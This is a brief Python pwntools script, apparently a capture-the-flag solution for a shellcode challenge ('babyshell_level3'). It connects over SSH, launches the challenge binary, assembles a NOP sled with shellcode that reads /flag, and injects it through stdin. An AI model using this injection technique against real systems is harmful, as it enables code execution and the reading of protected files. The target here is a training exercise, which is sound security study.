#!/usr/bin/env python3
from pwn import *
import re

context.arch = 'amd64'


def btos(n):
    return n.decode('UTF-8')
    
s = ssh(host="pwn")
f = SSHPath('/tmp/my_script.py', ssh=s)
f.touch()
f.write_text('import subprocess; subprocess.run("/challenge/babyshell_level3")')
p = s.process(['python', '/tmp/my_script.py'])
r = p.recvuntil(b"Reading 0x1000 bytes from stdin.")
print(r.decode())

shellcode=""
shellcode="nop \n"*1000
shellcode+=pwnlib.shellcraft.amd64.linux.cat("/flag")

shellcode=(asm(shellcode))

print('1', shellcode)
shellcode=bytes(shellcode)
p.send(shellcode)
print(p.recvall().decode("UTF-8"))
